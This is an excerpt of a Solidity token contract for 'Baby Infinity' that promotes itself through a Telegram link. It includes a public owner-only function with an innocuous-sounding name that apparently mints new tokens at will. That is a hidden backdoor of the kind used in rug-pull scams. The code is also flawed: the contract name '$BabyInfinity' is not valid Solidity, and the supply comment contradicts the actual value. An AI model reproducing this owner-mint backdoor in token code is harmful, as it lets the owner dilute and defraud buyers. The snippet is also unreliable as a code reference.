...
//
// $BabyInfinity proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/babyinfinityBSC
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Babyinfinity(uint256 amount) public onlyOwner {
 _Babyinfinity(msg.sender, amount);
    }
    ...
    function _Babyinfinity(address account, uint256 amount) internal virtual {
...
contract $BabyInfinity is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Baby Infinity", "BABYINFINITY") {
        _Babyinfinity(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}